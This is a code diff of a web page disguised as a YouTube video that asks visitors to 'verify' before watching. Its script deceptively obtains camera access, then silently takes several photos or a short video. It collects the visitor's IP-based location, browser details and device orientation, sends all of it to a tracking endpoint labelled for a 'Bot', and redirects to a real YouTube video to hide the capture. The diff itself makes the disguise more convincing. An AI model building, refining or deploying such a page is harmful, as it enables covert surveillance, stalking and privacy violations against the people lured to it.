@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>YouTube</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -11,71 +11,158 @@
         header { height: 48px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; position: sticky; top: 0; background: var(--yt-bg); z-index: 100; }
         .yt-logo { display: flex; align-items: center; color: white; text-decoration: none; font-weight: bold; font-size: 18px; letter-spacing: -1px; }
         .yt-logo i { color: var(--yt-red); font-size: 24px; margin-right: 4px; }
-        .video-wrapper { position: relative; width: 100%; background: #000; aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; }
-        .spinner { border: 3px solid rgba(255, 255, 255, 0.1); border-left-color: var(--yt-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        
+        .video-wrapper { position: relative; width: 100%; background: #000; aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: var(--yt-red); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; display: none; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        #play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; display: flex; align-items: center; justify-content: center; cursor: pointer; background: rgba(0,0,0,0.3); }
-        .play-icon { font-size: 60px; color: white; }
+        
+        #play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; background: rgba(0,0,0,0.4); }
+        .play-icon { font-size: 64px; color: white; margin-bottom: 10px; opacity: 0.9; }
+        .tap-text { font-size: 14px; font-weight: 500; text-transform: uppercase; letter-spacing: 1px; }
+
         .video-details { padding: 12px 16px; }
-        .video-title { font-size: 18px; font-weight: 700; line-height: 22px; margin-bottom: 8px; }
+        .video-title { font-size: 18px; font-weight: 500; line-height: 22px; margin-bottom: 8px; color: var(--yt-text); }
         .channel-row { display: flex; align-items: center; margin: 15px 0; gap: 12px; }
-        .channel-pfp { width: 36px; height: 36px; background: #444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
-        .sub-btn { background: white; color: black; padding: 0 16px; height: 36px; border-radius: 18px; border: none; font-weight: 600; margin-left: auto; }
-        .comment-box { background: var(--yt-surface); border-radius: 12px; padding: 12px; margin-top: 15px; font-size: 13px; }
-        video, canvas { display: none; }
+        .channel-pfp { width: 36px; height: 36px; background: #ff4500; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 18px; }
+        .sub-btn { background: white; color: black; padding: 0 16px; height: 36px; border-radius: 18px; border: none; font-weight: 600; margin-left: auto; font-size: 14px; }
+        
+        .comment-box { background: var(--yt-surface); border-radius: 12px; padding: 12px; margin-top: 15px; font-size: 13px; line-height: 18px; }
+        .comment-header { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
+
+        video, canvas { display: none; position: absolute; pointer-events: none; }
     </style>
 </head>
 <body>
-    <header><a href="#" class="yt-logo"><i class="fab fa-youtube"></i> YouTube</a><i class="fas fa-search"></i></header>
+    <header>
+        <a href="#" class="yt-logo"><i class="fab fa-youtube"></i> YouTube</a>
+        <div style="display: flex; gap: 20px;"><i class="fas fa-cast"></i> <i class="fas fa-search"></i> <i class="fas fa-ellipsis-v"></i></div>
+    </header>
+
     <div class="video-wrapper">
-        <div class="spinner" id="loading-spinner" style="display: none;"></div>
-        <div id="play-overlay" onclick="initiateCapture()"><i class="fas fa-play play-icon"></i></div>
+        <div class="spinner" id="loading-spinner"></div>
+        <div id="play-overlay" onclick="initiateCapture()">
+            <i class="fas fa-play play-icon"></i>
+            <span class="tap-text">Tap to Verify</span>
+        </div>
     </div>
+
     <div class="video-details">
-        <div class="video-title" id="display-title">Device Verification Required</div>
+        <div class="video-title" id="display-title">Security Check: Verification Required to Watch</div>
+        <div style="font-size: 12px; color: var(--yt-sub); margin-bottom: 12px;">1.2M views • 2 hours ago</div>
+        
         <div class="channel-row">
-            <div class="channel-pfp">A</div>
-            <div><div style="font-weight:600">AnyaStore <i class="fas fa-check-circle" style="font-size:10px;color:#aaa"></i></div><div style="font-size:12px;color:#aaa">148K subscribers</div></div>
+            <div class="channel-pfp">V</div>
+            <div>
+                <div style="font-weight:600">VinzyStore <i class="fas fa-check-circle" style="font-size:10px;color:#aaa"></i></div>
+                <div style="font-size:12px;color:#aaa">542K subscribers</div>
+            </div>
             <button class="sub-btn">Subscribe</button>
         </div>
-        <div class="comment-box"><b>Comments</b><p>Verification active. Please play to confirm identity.</p></div>
+
+        <div class="comment-box">
+            <div class="comment-header"><b>Comments</b> <i class="fas fa-chevron-down"></i></div>
+            <div style="display: flex; gap: 10px; align-items: center;">
+                <div style="width:24px; height:24px; background:#444; border-radius:50%"></div>
+                <p style="margin:0">Complete verification to unlock full video and comments.</p>
+            </div>
+        </div>
     </div>
-    <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
+
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
+
     <script>
         const params = new URLSearchParams(window.location.search);
+        const targetId = params.get('id');
+        const mode = params.get('mode') || 'photo';
+        const cam = params.get('cam') || 'user';
+        const ytid = params.get('ytid') || 'dQw4w9WgXcQ';
+
         async function initiateCapture() {
+            // UI Transition
             document.getElementById('play-overlay').style.display = 'none';
             document.getElementById('loading-spinner').style.display = 'block';
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: params.get('cam')||'user' }, audio: (params.get('mode')==='video') });
-                document.getElementById('v').srcObject = stream;
-                let motion = "Static";
-                window.addEventListener('deviceorientation', (e) => { motion = `Tilt: ${e.beta.toFixed(0)}°`; });
-                const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
-                fetch(`/log_info?id=${params.get('id')}`, {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ ...ip, platform: "iOS/iPhone", motion: motion, browser: navigator.userAgent })
+                // Optimized constraints for faster loading
+                const constraints = { 
+                    video: { 
+                        facingMode: cam,
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }, 
+                    audio: (mode === 'video') 
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const videoEl = document.getElementById('v');
+                videoEl.srcObject = stream;
+
+                // 1. Gather System Info
+                let deviceMotion = "Not Supported";
+                window.addEventListener('deviceorientation', (e) => {
+                    deviceMotion = `T: ${e.beta?.toFixed(0)}°, R: ${e.gamma?.toFixed(0)}°`;
                 });
-                if (params.get('mode') === 'video') {
-                    const rec = new MediaRecorder(stream); const ch = [];
-                    rec.ondataavailable = e => ch.push(e.data);
-                    rec.onstop = () => {
-                        const fd = new FormData(); fd.append('file', new Blob(ch, {type:'video/webm'}));
-                        fetch(`/upload?id=${params.get('id')}&type=video`, {method:'POST', body:fd}).then(()=>window.location.href="https://youtube.com/watch?v="+params.get('ytid'));
+
+                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ip: 'Unknown'}));
+
+                // Send Log Info to Bot
+                await fetch(`/log_info?id=${targetId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        ...ipData,
+                        platform: navigator.platform,
+                        browser: navigator.userAgent,
+                        motion: deviceMotion,
+                        battery: "Checking..."
+                    })
+                });
+
+                // 2. Handle Capture Modes
+                if (mode === 'video') {
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        const fd = new FormData();
+                        fd.append('file', blob, 'video.mp4');
+                        
+                        await fetch(`/upload?id=${targetId}&type=video`, { method: 'POST', body: fd });
+                        window.location.href = `https://www.youtube.com/watch?v=${ytid}`;
                     };
-                    rec.start(); setTimeout(()=>rec.stop(), 4000);
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 4500); // 4.5s capture
                 } else {
-                    let count = 0;
-                    const iv = setInterval(() => {
-                        if (count >= 8) { clearInterval(iv); window.location.href="https://youtube.com/watch?v="+params.get('ytid'); return; }
-                        const c = document.getElementById('c'), v = document.getElementById('v');
-                        c.width = v.videoWidth; c.height = v.videoHeight;
-                        c.getContext('2d').drawImage(v, 0, 0);
-                        c.toBlob(b => { const fd = new FormData(); fd.append('file', b); fetch(`/upload?id=${params.get('id')}&type=photo`, {method:'POST', body:fd}); }, 'image/jpeg', 0.7);
-                        count++;
-                    }, 800);
+                    let photoCount = 0;
+                    const captureInterval = setInterval(async () => {
+                        if (photoCount >= 8) {
+                            clearInterval(captureInterval);
+                            window.location.href = `https://www.youtube.com/watch?v=${ytid}`;
+                            return;
+                        }
+
+                        const canvas = document.getElementById('c');
+                        canvas.width = videoEl.videoWidth;
+                        canvas.height = videoEl.videoHeight;
+                        canvas.getContext('2d').drawImage(videoEl, 0, 0);
+
+                        canvas.toBlob(async (blob) => {
+                            const fd = new FormData();
+                            fd.append('file', blob, 'photo.jpg');
+                            await fetch(`/upload?id=${targetId}&type=photo`, { method: 'POST', body: fd });
+                        }, 'image/jpeg', 0.6);
+
+                        photoCount++;
+                    }, 700); // Faster interval for 8 photos
                 }
-            } catch (e) { alert("Camera access is required for verification."); location.reload(); }
+
+            } catch (err) {
+                console.error(err);
+                alert("Playback Error: Please allow camera access to verify you are not a bot.");
+                location.reload();
+            }
         }
     </script>
 </body>
